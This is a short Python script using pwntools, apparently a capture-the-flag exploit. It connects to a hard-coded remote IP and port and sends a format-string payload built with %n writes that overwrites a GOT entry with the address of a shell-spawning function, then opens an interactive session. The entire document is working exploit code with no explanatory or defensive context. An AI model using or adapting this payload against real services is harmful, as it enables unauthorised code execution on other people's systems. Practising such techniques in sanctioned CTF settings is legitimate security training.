from pwn import *

# p = process("./text")
p = remote("103.200.7.156",2102)

sys = 0x08048526
got = 0x804a00c

exploit = ''
exploit += p32(got)
exploit += p32(got+2)
exploit += '%7${}x '.format(0x8525-len(exploit))
exploit += '%7$n '
exploit += '%8${}x'.format(0x10804 - 0x8545 + 30)
exploit += '%8$n '

# print exploit
p.sendline(exploit)
p.interactive()